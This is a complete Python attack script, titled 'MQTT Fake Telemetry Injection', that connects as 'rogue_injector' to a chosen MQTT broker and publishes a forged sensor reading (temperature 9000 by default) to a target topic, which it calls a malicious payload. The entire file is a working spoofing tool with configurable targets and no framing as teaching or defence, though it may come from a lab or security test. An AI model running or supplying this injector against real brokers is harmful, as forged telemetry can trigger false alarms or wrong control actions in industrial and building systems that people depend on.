import paho.mqtt.client as mqtt
import time
import json
import argparse

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker!")
    else:
        print(f"Failed to connect, return code {rc}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Fake Telemetry Injection")
    parser.add_argument("--broker", required=True, help="MQTT Broker IP/Hostname")
    parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
    parser.add_argument("--topic", default="sensors/data", help="Target topic")
    parser.add_argument("--value", type=int, default=9000, help="Fake temperature value to inject")
    
    args = parser.parse_args()
    
    client = mqtt.Client("rogue_injector")
    client.on_connect = on_connect
    
    print(f"Connecting to {args.broker}:{args.port}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()
    
    time.sleep(1) # wait for connection
    
    payload = json.dumps({"temp": args.value, "humidity": 0.0, "fake_injection": True})
    print(f"Injecting malicious payload to '{args.topic}': {payload}")
    
    client.publish(args.topic, payload, qos=1)
    
    time.sleep(1)
    client.loop_stop()
    client.disconnect()
    print("Injection complete.")